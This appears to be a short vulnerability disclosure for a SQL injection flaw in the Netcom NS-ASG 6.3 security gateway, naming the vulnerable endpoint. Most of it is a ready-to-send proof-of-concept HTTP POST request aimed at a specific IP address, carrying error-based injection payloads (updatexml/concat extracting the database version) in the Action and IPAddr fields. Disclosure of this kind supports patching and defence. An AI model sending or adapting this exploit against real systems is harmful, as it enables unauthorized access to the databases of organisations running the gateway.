There is a SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official website:https://www.netentsec.com/

version:NS-ASG 6.3

Vulnerability points：/protocol/firewall/addaddress_interpret.php

As follows, there is no validation during the execution of SQL injection

<img width="740" alt="image" src="https://github.com/ggg48966/cve/assets/51871401/897f6ac5-a492-4a18-8861-026fe6655732">

Construct POC and successfully obtain database information
Poc：
```
POST /protocol/index.php HTTP/1.1
Content-Length: 322
Host: 106.37.206.12
Cookie: PHPSESSID=bfd2e9f9df564de5860117a93ecd82de
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Content-Type: application/x-www-form-urlencoded
Referer: https://106.37.206.12/protocol/index.php
Connection: close

jsoncontent={"protocolType":"addaddress_interpret","messagecontent":["{\"Action\":\"1'and(updatexml(1,concat(0x7e,(select+version())),1))='\",\"IPAddr\":\"eth0'and(updatexml(1,concat(0x7e,(select+version())),1))='\",\"MacAddr\":\"\",\"DestIP\":\"\",\"DestMask\":\"255.255.255.0\",\"Description\":\"Sample+Description\"}"]}
```
<img width="758" alt="image" src="https://github.com/ggg48966/cve/assets/51871401/5885ed7d-372a-40a9-95dd-a99f7e59a05b">

